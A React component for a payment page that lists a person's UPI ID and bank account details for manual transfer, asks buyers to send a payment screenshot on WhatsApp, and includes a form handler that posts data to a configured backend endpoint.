

import { useState, useEffect, useRef } from 'react'

import { useForm } from "react-hook-form"
import { useNavigate } from 'react-router-dom';

function Mainpayment() {


    const [count, setCount] = useState()
    const navigate = useNavigate();


    const handleclick = () => {
        navigate("/")
    }

    const {
        register,
        handleSubmit,
        watch,
        formState: { errors, isSubmitting },
    } = useForm();

    const delay = (d) => {
        return new Promise((resolve, reject) => {
            setTimeout(() => {
                resolve()
            }, d * 3000);
        })
    }

    //const onSubmit = async (data) => {
    // await delay(2)
    //let r = await fetch("http://localhost:3000/", { method: "post", body: JSON.stringify(data) })
    //let res = await r.text()
    //console.log(data, res)


    const onSubmit = async (data) => {
        navigate("/Loading.")
        let r = await fetch(import.meta.env.VITE_MONGO, {
            method: "POST", headers: {
                "Content-Type": "application/json",
            }, body: JSON.stringify(data)


        })
        let res = await r.text()

        console.log(data, res)


    }

    return (
        <>
            <div className="payment-body">



                <div className="step-for-pp">Simple Steps For Payment</div>

                <div className="upi-payment-step">
                    <div className="upi-icon2"><i class="fa-solid fa-circle-right"></i></div>

                    <div className="upi-heading2"><b>Copy</b> Bank Details or UPI ID <b>Open</b> your <br /> payment App  Paytm, Phone Pe, Google Pay, <br /> Tap To Transfer Money</div>
                </div>


                <div className="upi-payment-step">
                    <div className="upi-icon2"><i class="fa-solid fa-indian-rupee-sign"></i></div>

                    <div className="upi-heading2"><b>Complete</b> the payment by selecting the   <br />bank or UPI ID payment Transfer </div>
                </div>

                <div className="upi-payment-step">
                    <div className="upi-icon2"><i class="fa-solid fa-circle-check"></i></div>

                    <div className="upi-heading2"><b>Send</b> payment Done Confarmation <br /> Screenshot on whatsapp for further Details <br /> and order Confirmation</div>
                </div>











                <h3 className='pay-met-name'>UPI</h3>


                <div className="pay-cont">


                    <div className="pay-form">
                       
                            <div className="card-num card-num pay-detailss">
                                <label className='pay-label'  >Name : </label>
                                <b>     ADUTYA HATAGALE</b>
                                <br />
                                <label className='pay-label'  >UPI ID :</label>
                                <b>     Jhkj86537@oksbi</b>
                            </div>






                            <a href="/Loading." id='pay'>  <button class="adress-btn"  >Continue</button> </a>

                        
                    </div>

                </div>




                <h3 className='pay-met-name'>BANK TRANSFER</h3>


                <div className="pay-cont">


                    <div className="pay-form">
                        
                            <div className="card-num pay-detailss">
                                <label className='pay-label'  >Bank Name : </label>
                                <b>   SHAHU BANK BEED  </b>
                                <br />
                                <label className='pay-label'  >A/C No :</label>
                                <b>     1234567435790574</b> <br />
                                <label className='pay-label'  >Acc. Name : </label>
                                <b>     ADUTYA HATAGALE</b>
                                <br />
                                <label className='pay-label'  >IFSC Code :</label>
                                <b>     CRUB0000015</b>
                            </div>






                            <a href="/Loading." id='pay'>   <button class="adress-btn" >Continue</button>  </a>

                        
                    </div>

                </div>






                <div className="main-payment-box">

                    <div className="payment-option-box">
                        <div className="card-logo">

                            <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#5f6368"><path d="M880-720v480q0 33-23.5 56.5T800-160H160q-33 0-56.5-23.5T80-240v-480q0-33 23.5-56.5T160-800h640q33 0 56.5 23.5T880-720Zm-720 80h640v-80H160v80Zm0 160v240h640v-240H160Zm0 240v-480 480Z" /></svg>

                            <h5 id='c-heading'>DEIT/CREDIT CARDS</h5>

                        </div>

                        <a id='pay' href="/Loading..">Pay</a>
                    </div>

                </div>


                <div className="tips-box">
                    <div className="tips">Important Tips</div>

                    <div className="important-lins">* After Payment Done Send Payment done </div>
                    <div className="important-lins">* Confarmation Screenshot on Whatsapp</div>
                    <div className="important-lins">* Please ensure your Card is enabled for online transaction</div>
                    <div className="important-lins">* Please ensure to complete the payment transaction well within time limits</div>




                </div>

            </div>
        </>
    )
}

export default Mainpayment